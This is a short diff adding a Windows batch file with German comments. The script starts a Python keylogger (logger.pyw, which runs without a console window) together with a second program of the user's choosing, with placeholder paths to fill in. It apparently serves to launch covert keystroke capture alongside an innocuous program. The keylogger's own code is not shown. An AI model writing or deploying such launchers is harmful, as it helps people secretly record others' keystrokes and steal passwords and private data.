@@ -1,0 +1,6 @@
+::davor key logger text file verändern  also klammern ersetzen durch pfad von beiden programmen
+
+@echo off
+
+start "" "C:\(pfad einfügen von keylogger)logger.pyw "
+start "" "C:\(pfad einfügen von gewünschter kombinations programm)"
